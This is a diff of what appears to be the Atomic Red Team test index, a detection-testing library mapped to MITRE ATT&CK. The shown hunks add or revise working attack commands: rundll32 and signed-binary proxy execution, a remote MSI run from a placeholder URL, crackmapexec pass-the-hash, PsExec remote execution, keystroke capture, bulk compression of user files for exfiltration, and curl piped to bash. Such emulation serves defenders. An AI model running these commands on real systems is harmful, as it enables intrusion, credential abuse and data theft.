-          powershell.exe -noprofile -windowstyle hidden -executionpolicy bypass iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
+          iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
         cleanup_command: |
-          del /Q /F %SystemRoot%\Temp\art-marker.txt
-          REG DELETE "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /f
+          cmd /c del /Q /F %SystemRoot%\Temp\art-marker.txt
+          cmd /c REG DELETE "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /f
     - name: PowerShell Downgrade Attack
       description: 'Attempts to run powershell commands in version 2.0 https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/
 
@@ -19235,7 +20867,7 @@ execution:
         source_file:
           description: Location of the CSharp source_file
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1121\src\T1121.cs
+          default: PathToAtomicsFolder\T1121\src\T1121.cs
       executor:
         name: command_prompt
         elevation_required: false
@@ -19258,7 +20890,7 @@ execution:
         source_file:
           description: Location of the CSharp source_file
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1121\src\T1121.cs
+          default: PathToAtomicsFolder\T1121\src\T1121.cs
       executor:
         name: powershell
         elevation_required: false
@@ -19351,7 +20983,7 @@ execution:
         filename:
           description: Name of the local file, include path.
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1117\RegSvr32.sct
+          default: PathToAtomicsFolder\T1117\RegSvr32.sct
       executor:
         name: command_prompt
         elevation_required: false
@@ -19387,7 +21019,7 @@ execution:
         dll_name:
           description: Name of DLL to Execute, DLL Should export DllRegisterServer
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1117\bin\AllTheThingsx86.dll
+          default: PathToAtomicsFolder\T1117\bin\AllTheThingsx86.dll
       executor:
         name: command_prompt
         elevation_required: false
@@ -19464,11 +21096,103 @@ execution:
         file_url:
           description: location of the payload
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/T1085.sct
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/src/T1085.sct
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();"
+        command: 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();
+
+'
+    - name: Rundll32 execute VBscript command
+      description: |
+        Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.
+
+        Technique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_to_execute:
+          description: Command for rundll32.exe to execute
+          type: string
+          default: calc.exe
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)
+
+'
+    - name: Rundll32 advpack.dll Execution
+      description: |
+        Test execution of a command using rundll32.exe with advpack.dll.
+
+        Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml
+      supported_platforms:
+      - windows
+      input_arguments:
+        inf_to_execute:
+          description: Local location of inf file
+          type: string
+          default: PathToAtomicsFolder\T1085\src\T1085.inf
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'rundll32.exe advpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
+
+'
+    - name: Rundll32 ieadvpack.dll Execution
+      description: |
+        Test execution of a command using rundll32.exe with ieadvpack.dll.
+
+        Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml
+      supported_platforms:
+      - windows
+      input_arguments:
+        inf_to_execute:
+          description: Local location of inf file
+          type: string
+          default: PathToAtomicsFolder\T1085\src\T1085.inf
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'rundll32.exe ieadvpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
+
+'
+    - name: Rundll32 syssetup.dll Execution
+      description: |
+        Test execution of a command using rundll32.exe with syssetup.dll.
+
+        Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml
+      supported_platforms:
+      - windows
+      input_arguments:
+        inf_to_execute:
+          description: Local location of inf file
+          type: string
+          default: PathToAtomicsFolder\T1085\src\T1085_DefaultInstall.inf
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall
+          128 .\#{inf_to_execute}
+
+'
+    - name: Rundll32 setupapi.dll Execution
+      description: |
+        Test execution of a command using rundll32.exe with setupapi.dll.
+
+        Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml
+      supported_platforms:
+      - windows
+      input_arguments:
+        inf_to_execute:
+          description: Local location of inf file
+          type: string
+          default: PathToAtomicsFolder\T1085\src\T1085_DefaultInstall.inf
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128
+          .\#{inf_to_execute}
 
 '
   T1053:
@@ -19891,7 +21615,7 @@ execution:
         dll_payload:
           description: DLL to inject
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1218\src\x64\T1218.dll
+          default: PathToAtomicsFolder\T1218\src\x64\T1218.dll
         process_id:
           description: PID of process receiving injection
           type: string
@@ -19930,11 +21654,96 @@ execution:
         dll_payload:
           description: DLL to execute
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1218\src\Win32\T1218-2.dll
+          default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
       executor:
         name: command_prompt
-        command: "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path #{dll_payload}
-          \n"
+        command: 'C:\Windows\SysWow64\Register-CimProvider.exe -Path #{dll_payload}
+
+'
+    - name: Msiexec.exe - Execute Local MSI file
+      description: 'Execute arbitrary MSI file. Commonly seen in application installation.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        msi_payload:
+          description: MSI file to execute
+          type: Path
+          default: PathToAtomicsFolder\T1218\src\Win32\T1218.msi
+      executor:
+        name: command_prompt
+        command: 'msiexec.exe /q /i "#{msi_payload}"
+
+'
+    - name: Msiexec.exe - Execute Remote MSI file
+      description: 'Execute arbitrary MSI file retrieved remotely. Less commonly seen
+        in application installation, commonly seen in malware execution.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        msi_payload:
+          description: MSI file to execute
+          type: String
+          default: http://site.com/file.msi
+      executor:
+        name: command_prompt
+        command: 'msiexec.exe /q /i "#{msi_payload}"
+
+'
+    - name: Msiexec.exe - Execute Arbitrary DLL
+      description: 'Execute arbitrary DLL file stored locally. Commonly seen in application
+        installation.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        dll_payload:
+          description: DLL to execute
+          type: Path
+          default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
+      executor:
+        name: command_prompt
+        command: 'msiexec.exe /y "#{dll_payload}"
+
+'
+    - name: Odbcconf.exe - Execute Arbitrary DLL
+      description: 'Execute arbitrary DLL file stored locally.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        dll_payload:
+          description: DLL to execute
+          type: Path
+          default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
+      executor:
+        name: command_prompt
+        command: 'odbcconf.exe /S /A {REGSVR "#{dll_payload}"}
+
+'
+    - name: InfDefaultInstall.exe .inf Execution
+      description: |
+        Test execution of a .inf using InfDefaultInstall.exe
+
+        Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml
+      supported_platforms:
+      - windows
+      input_arguments:
+        inf_to_execute:
+          description: Local location of inf file
+          type: string
+          default: PathToAtomicsFolder\T1218\src\Infdefaultinstall.inf
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'InfDefaultInstall.exe #{inf_to_execute}
+
+'
   T1216:
     technique:
       x_mitre_data_sources:
@@ -20006,6 +21815,44 @@ execution:
           localhost "script:#{remote_payload}"
 
 '
+    - name: SyncAppvPublishingServe Signed Script PowerShell Command Execution
+      description: 'Executes the signed SyncAppvPublishingServe script with options
+        to execute an arbitrary PowerShell command.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_to_execute:
+          description: A PowerShell command to execute.
+          type: string
+          default: Start-Process calc
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'C:\windows\system32\SyncAppvPublishingServe.vbs “\n;#{command_to_execute}”
+
+'
+    - name: manage-bde.wsf Signed Script Command Execution
+      description: 'Executes the signed manage-bde.wsf script with options to execute
+        an arbitrary command.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_to_execute:
+          description: A command to execute.
+          type: Path
+          default: C:\Windows\System32\calc.exe
+      executor:
+        name: command_prompt
+        elevation_required: false
+        prereq_command: ''
+        command: |
+          set comspec=#{command_to_execute}
+          cscript manage-bde.wsf
+        cleanup_command: set comspec=C:\Windows\System32\cmd.exe
   T1153:
     technique:
       x_mitre_data_sources:
@@ -20637,7 +22484,7 @@ execution:
           default: ipconfig
       executor:
         name: powershell
-        command: 'invoke-command -computer_name #{host_name} -scriptblock {#{remote_command}}
+        command: 'invoke-command -ComputerName #{host_name} -scriptblock {#{remote_command}}
 
 '
   T1220:
@@ -20742,11 +22589,11 @@ execution:
         xmlfile:
           description: Location of the test XML file on the local filesystem.
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1220\src\msxslxmlfile.xml
+          default: PathToAtomicsFolder\T1220\src\msxslxmlfile.xml
         xslfile:
           description: Location of the test XSL script file on the local filesystem.
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1220\src\msxslscript.xsl
+          default: PathToAtomicsFolder\T1220\src\msxslscript.xsl
       executor:
         name: command_prompt
         command: 'C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
@@ -20789,7 +22636,7 @@ execution:
         local_xsl_file:
           description: Location of the test XSL script file on the local filesystem.
           type: path
-          default: C:\AtomicRedTeam\atomics\T1220\src\wmicscript.xsl
+          default: PathToAtomicsFolder\T1220\src\wmicscript.xsl
       executor:
         name: command_prompt
         command: 'wmic.exe #{wmic_command} /FORMAT:#{local_xsl_file}
@@ -21085,10 +22932,10 @@ lateral-movement:
       modified: '2019-07-18T16:56:39.990Z'
       identifier: T1075
     atomic_tests:
-    - name: Mimikatz Pass the Hash
-      description: |
-        Note: must dump hashes first
-        [Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)
+    - name: crackmapexec Pass the Hash
+      description: 'command execute with crackmapexec
+
+'
       supported_platforms:
       - windows
       input_arguments:
@@ -21101,14 +22948,22 @@ lateral-movement:
           type: string
           default: atomic.local
         ntlm:
-          description: ntlm hash
+          description: command
           type: string
           default: cc36cf7a8514893efccd3324464tkg1a
+        command:
+          description: command to execute
+          type: string
+          default: whoami
       executor:
         name: command_prompt
-        command: 'mimikatz # sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}
+        elevation_required: false
+        prereq_command: 'powershell -c if(Test-Path C:\CrackMapExecWin\crackmapexec.exe)
+          { 0 } else { -1 }
 
 '
+        command: "crackmapexec #{domain} -u #{user_name} -H #{ntlm} -x #{command}
+          \n"
   T1097:
     technique:
       x_mitre_data_sources:
@@ -21741,6 +23596,28 @@ lateral-movement:
         command: 'New-PSDrive -name #{map_name} -psprovider filesystem -root \\#{computer_name}\#{share_name}
 
 '
+    - name: Copy and Execute File with PsExec
+      description: 'Copies a file to a remote host and executes it using PsExec. Requires
+        the download of PsExec from [https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        remote_host:
+          description: Remote computer to receive the copy and execute the file
+          type: String
+          default: "\\\\localhost"
+        command_path:
+          description: File to copy and execute
+          type: Path
+          default: C:\Windows\System32\cmd.exe
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: 'psexec.exe #{remote_host} -c #{command_path}
+
+'
   T1028:
     technique:
       x_mitre_data_sources:
@@ -21902,7 +23779,7 @@ lateral-movement:
           default: ipconfig
       executor:
         name: powershell
-        command: 'invoke-command -computer_name #{host_name} -scriptblock {#{remote_command}}
+        command: 'invoke-command -ComputerName #{host_name} -scriptblock {#{remote_command}}
 
 '
 collection:
@@ -22191,8 +24068,26 @@ collection:
       - macos
       executor:
         name: bash
-        command: curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/Discovery.sh
+        command: 'curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/Discovery.sh
           | bash -s > /tmp/discovery.log
+
+'
+    - name: Zip a Folder with PowerShell
+      description: 'use living off the land tools to encrypt and zip a file for exfiltration
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: 'Compress-Archive -Path $PathToAtomicsFolder\T1074\bin\Folder_to_encrypt
+          -DestinationPath $env:TEMP\Folder_to_encrypt.zip
+
+'
+        cleanup_command: 'Remove-Item -Path $env:TEMP\Folder_to_encrypt.zip
+
+'
   '':
     technique:
       x_mitre_permissions_required:
@@ -22470,7 +24365,7 @@ collection:
     - name: Input Capture
       description: |
         Utilize PowerShell and external resource to capture keystrokes
-        [Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056/Get-Keystrokes.ps1)
+        [Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056/src/Get-Keystrokes.ps1)
         Provided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)
       supported_platforms:
       - windows
@@ -22481,7 +24376,7 @@ collection:
           default: c:\key.log
       executor:
         name: powershell
-        command: ".\\Get-Keystrokes.ps1 -LogPath #{filepath}\n"
+        command: "$PathToAtomicsFolder\\T1056\\src\\Get-Keystrokes.ps1 -LogPath #{filepath}\n"
   T1113:
     technique:
       x_mitre_data_sources:
@@ -22701,15 +24596,18 @@ exfiltration:
         input_file:
           description: Path that should be compressed into our output file
           type: Path
-          default: C:\*
+          default: "$env:USERPROFILE"
         output_file:
           description: Path where resulting compressed data should be placed
           type: Path
-          default: C:\test\Data.zip
+          default: "$env:USERPROFILE\\data.zip"
       executor:
         name: powershell
         elevation_required: false
         command: 'dir #{input_file} -Recurse | Compress-Archive -DestinationPath #{output_file}
+
+'
+        cleanup_command: 'Remove-Item -path #{output_file}
 
 '
     - name: Compress Data for Exfiltration With Rar
@@ -22718,20 +24616,28 @@ exfiltration:
       supported_platforms:
       - windows
       input_arguments:
-        input_file:
+        input_path:
           description: Path that should be compressed into our output file
           type: Path
-          default: "*.docx"
+          default: "%USERPROFILE%"
+        file_extension:
+          description: Extension of files to compress
+          type: String
+          default: ".txt"
         output_file:
           description: Path where resulting compressed data should be placed
           type: Path
-          default: exfilthis.rar
+          default: "%USERPROFILE%\\data.rar"
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'rar a -r #{output_file} #{input_file}
+        prereq_command: 'rar /?
 
 '
+        command: 'rar a -r #{output_file} #{input_path}*{file_extension}
+
+'
+        cleanup_command: del -f
     - name: Data Compressed - nix - zip
       description: 'An adversary may compress data (e.g., sensitive documents) that
         is collected prior to exfiltration. This test uses standard zip compression.
@@ -22745,17 +24651,21 @@ exfiltration:
           description: Path that should be compressed into our output file, may include
             wildcards
           type: Path
-          default: "/tmp/victim-files/*"
+          default: "$HOME/*.txt"
         output_file:
           description: Path that should be output as a zip archive
           type: Path
-          default: "/tmp/victim-files.zip"
+          default: "$HOME/data.zip"
       executor:
         name: sh
         elevation_required: false
+        prereq_command: 'ls #{input_file}
+
+'
         command: 'zip #{output_file} #{input_files}
 
 '
+        cleanup_command: rm -f
     - name: Data Compressed - nix - gzip Single File
       description: 'An adversary may compress data (e.g., sensitive documents) that
         is collected prior to exfiltration. This test uses standard gzip compression.
@@ -22768,11 +24678,20 @@ exfiltration:
         input_file:
           description: Path that should be compressed
           type: Path
-          default: "/tmp/victim-gzip.txt"
+          default: "$HOME/victim-gzip.txt"
+        input_content:
+          description: contents of compressed files if file does not already exist.
+            default contains test credit card and social security number
+          type: String
+          default: 'confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101'
       executor:
         name: sh
         elevation_required: false
-        command: 'gzip -f #{input_file}
+        command: 'test -e #{input_file} && gzip -k #{input_file} || (echo ''#{input_content}''
+          >> #{input_file}; gzip -k #{input_file})
+
+'
+        cleanup_command: 'rm -f #{input_file}.gz
 
 '
     - name: Data Compressed - nix - tar Folder or File
@@ -22787,15 +24706,21 @@ exfiltration:
         input_file_folder:
           description: Path that should be compressed
           type: Path
-          default: "/tmp/victim-files/"
+          default: "$HOME/$USERNAME"
         output_file:
           description: File that should be output
           type: Path
-          default: "/tmp/victim-files.tar.gz"
+          default: "$HOME/data.tar.gz"
       executor:
         name: sh
         elevation_required: false
-        command: 'tar -cvzf #{output_file} #{input_file_folder}'
+        prereq_command: 'test -e #{input_file_folder}
+
+'
+        command: 'tar -cvzf #{output_file} #{input_file_folder}
+
+'
+        cleanup_command: 'rm -f #{output_file}'
   T1022:
     technique:
       x_mitre_data_sources:
@@ -22865,11 +24790,11 @@ exfiltration:
         elevation_required: false
         command: |
           echo "This file will be encrypted" > /tmp/victim-gpg.txt
-          mkdir /tmp/victim-files
+          mkdir PathToAtomicsFolder/T1022/victim-files
           cd /tmp/victim-files
           touch a b c d e f g
-          zip --password "insert password here" /tmp/victim-files.zip /tmp/victim-files/*
-          gpg -c /tmp/victim-gpg.txt
+          zip --password "insert password here" $PathToAtomicsFolder/victim-files.zip /tmp/victim-files/*
+          gpg -c $PathToAtomicsFolder/T1022/victim-gpg.txt
           <enter passphrase and confirm>
           ls -l
     - name: Compress Data and lock with password for Exfiltration with winrar
@@ -22882,9 +24807,9 @@ exfiltration:
         name: command_prompt
         elevation_required: false
         command: |
-          mkdir ./tmp/victim-files
-          cd ./tmp/victim-files
-          echo "This file will be encrypted" > ./encrypted_file.txt
+          mkdir .\tmp\victim-files
+          cd .\tmp\victim-files
+          echo "This file will be encrypted" > .\encrypted_file.txt
           rar a -hp"blue" hello.rar
           dir
     - name: Compress Data and lock with password for Exfiltration with winzip
@@ -22898,9 +24823,9 @@ exfiltration:
         elevation_required: false
         command: |
           path=%path%;"C:\Program Files (x86)\winzip"
-          mkdir ./tmp/victim-files
-          cd ./tmp/victim-files
-          echo "This file will be encrypted" > ./encrypted_file.txt
+          mkdir .\tmp\victim-files
+          cd .\tmp\victim-files
+          echo "This file will be encrypted" > .\encrypted_file.txt
           winzip32 -min -a -s"hello" archive.zip *
           dir
     - name: Compress Data and lock with password for Exfiltration with 7zip
@@ -22913,9 +24838,9 @@ exfiltration:
         name: command_prompt
         elevation_required: false
         command: |
-          mkdir ./tmp/victim-files
-          cd ./tmp/victim-files
-          echo "This file will be encrypted" > ./encrypted_file.txt
+          mkdir $PathToAtomicsFolder\T1022\victim-files
+          cd $PathToAtomicsFolder\T1022\victim-files
+          echo "This file will be encrypted" > .\encrypted_file.txt
           7z a archive.7z -pblue
           dir
   T1030:
@@ -23289,9 +25214,39 @@ command-and-control:
         command: 'export #{proxy_scheme}_proxy=#{proxy_server}
 
 '
-        cleanup_command: |-
+        cleanup_command: |
           unset http_proxy
           unset https_proxy
+    - name: portproxy reg key
+      description: |
+        Adds a registry key to set up a proxy on the endpoint at
+        HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4
+      supported_platforms:
+      - windows
+      input_arguments:
+        listenport:
+          description: Specifies the IPv4 port, by port number or service name, on
+            which to listen.
+          type: string
+          default: 1337
+        connectport:
+          description: Specifies the IPv4 port, by port number or service name, to
+            which to connect. If connectport is not specified, the default is the
+            value of listenport on the local computer.
+          type: string
+          default: 1337
+        connectaddress:
+          description: Specifies the IPv4 address to which to connect. Acceptable
+            values are IP address, computer NetBIOS name, or computer DNS name. If
+            an address is not specified, the default is the local computer.
+          type: string
+          default: 127.0.0.1
+      executor:
+        name: powershell
+        elevation_required: true
+        command: netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport}
+          connectaddress=#{connectaddress}
+        cleanup_command: netsh interface portproxy delete v4tov4 listenport=#{listenport}
   T1132:
     technique:
       x_mitre_data_sources:
